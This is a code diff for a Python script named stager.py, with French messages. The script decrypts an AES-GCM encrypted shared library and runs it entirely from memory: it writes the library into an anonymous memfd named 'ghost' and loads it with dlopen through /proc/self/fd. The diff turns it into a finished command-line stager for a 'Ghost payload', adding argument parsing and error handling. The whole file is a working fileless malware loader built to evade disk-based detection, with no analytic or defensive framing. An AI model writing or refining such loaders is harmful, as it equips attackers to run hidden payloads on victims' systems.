@@ -1,63 +1,119 @@
-# stager.py
+#!/usr/bin/env python3
 import ctypes
 import os
+import sys
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
 
-# Configuration
-LIBC = ctypes.CDLL("libc.so.6")
-LIBDL = ctypes.CDLL("libdl.so.2") # Parfois intégré à libc sur les systèmes récents
+LIBC = ctypes.CDLL("libc.so.6", use_errno=True)
+LIBDL = ctypes.CDLL("libdl.so.2", use_errno=True)
 
-# Constantes noyau (x86_64)
 MFD_CLOEXEC = 0x0001
 SYS_memfd_create = 319
 RTLD_NOW = 0x00002
 RTLD_GLOBAL = 0x00100
 
+LIBC.syscall.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_long, ctypes.c_long]
+LIBC.syscall.restype = ctypes.c_long
+LIBC.write.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t]
+LIBC.write.restype = ctypes.c_ssize_t
+LIBC.close.argtypes = [ctypes.c_int]
+LIBC.close.restype = ctypes.c_int
+LIBDL.dlopen.argtypes = [ctypes.c_char_p, ctypes.c_int]
+LIBDL.dlopen.restype = ctypes.c_void_p
+LIBDL.dlerror.restype = ctypes.c_char_p
+
+
 def run_fileless(decrypted_data):
-    # 1. Création du memfd via syscall direct
-    # name="ghost", flags=MFD_CLOEXEC
-    fd = LIBC.syscall(SYS_memfd_create, b"ghost", MFD_CLOEXEC)
+    name = b"ghost"
+    fd = LIBC.syscall(
+        SYS_memfd_create,
+        ctypes.c_char_p(name),
+        ctypes.c_int(MFD_CLOEXEC),
+    )
     if fd < 0:
+        errno = ctypes.get_errno()
+        print(f"[-] memfd_create failed: {os.strerror(errno)}")
         return False
 
-    # 2. Écriture des octets en mémoire
-    LIBC.write(fd, decrypted_data, len(decrypted_data))
+    data_len = len(decrypted_data)
+    write_result = LIBC.write(fd, decrypted_data, data_len)
+    if write_result != data_len:
+        errno = ctypes.get_errno()
+        print(f"[-] write failed: {os.strerror(errno)}")
+        LIBC.close(fd)
+        return False
 
-    # 3. Chargement via /proc/self/fd/
     path = f"/proc/self/fd/{fd}".encode()
-    
-    # Signature: void *dlopen(const char *filename, int flag);
-    LIBDL.dlopen.restype = ctypes.c_void_p
     handle = LIBDL.dlopen(path, RTLD_NOW | RTLD_GLOBAL)
-    
+
     if not handle:
-        error = ctypes.c_char_p(LIBDL.dlerror()).value
-        print(f"[-] dlopen error: {error}")
+        error = LIBDL.dlerror()
+        if error:
+            print(f"[-] dlopen error: {error.decode()}")
+        LIBC.close(fd)
         return False
 
-    # 4. Fermeture du FD (la lib reste mappée)
     LIBC.close(fd)
     return True
 
+
 def stage(encrypted_payload_bytes, hex_key):
-    key = bytes.fromhex(hex_key)
+    if not hex_key or hex_key == "VOTRE_CLE_HEX_ICI":
+        print("[-] Erreur: Clé hexadecimale non configuree dans stager.py")
+        return False
+
+    try:
+        key = bytes.fromhex(hex_key)
+    except ValueError:
+        print("[-] Erreur: Cle hexadecimale invalide")
+        return False
+
+    if len(encrypted_payload_bytes) < 12:
+        print("[-] Erreur: Payload trop court (doit contenir nonce + ciphertext)")
+        return False
+
     nonce = encrypted_payload_bytes[:12]
     ciphertext = encrypted_payload_bytes[12:]
-    
-    # Déchiffrement en RAM
+
     aesgcm = AESGCM(key)
+
     try:
         decrypted_data = aesgcm.decrypt(nonce, ciphertext, None)
-        print("[+] Déchiffrement réussi.")
-        if run_fileless(decrypted_data):
-            print("[+] Payload exécuté depuis la mémoire.")
+        print("[+] Dechiffrement reussi.")
     except Exception as e:
-        print(f"[-] Échec : {e}")
+        print(f"[-] Echec du dechiffrement: {e}")
+        return False
 
-# Exemple d'usage (le payload serait normalement récupéré via requests)
+    if run_fileless(decrypted_data):
+        print("[+] Payload execute depuis la memoire.")
+        return True
+
+    return False
+
+
 if __name__ == "__main__":
-    # Simuler la récupération du payload et de la clé
-    with open("payload.so.enc", "rb") as f:
-        p = f.read()
-    k = "VOTRE_CLE_HEX_ICI"
-    stage(p, k)
+    import argparse
+
+    parser = argparse.ArgumentParser(description="Stager fileless pour Ghost payload")
+    parser.add_argument(
+        "-p", "--payload", required=True, help="Fichier payload chiffre"
+    )
+    parser.add_argument(
+        "-k", "--key", required=True, help="Cle hexadecimale (32 octets = 64 chars)"
+    )
+    args = parser.parse_args()
+
+    if not os.path.exists(args.payload):
+        print(f"[-] Erreur: Fichier payload introuvable: {args.payload}")
+        sys.exit(1)
+
+    with open(args.payload, "rb") as f:
+        payload = f.read()
+
+    if stage(payload, args.key):
+        print("[+] Succes")
+        sys.exit(0)
+    else:
+        print("[-] Echec")
+        sys.exit(1)
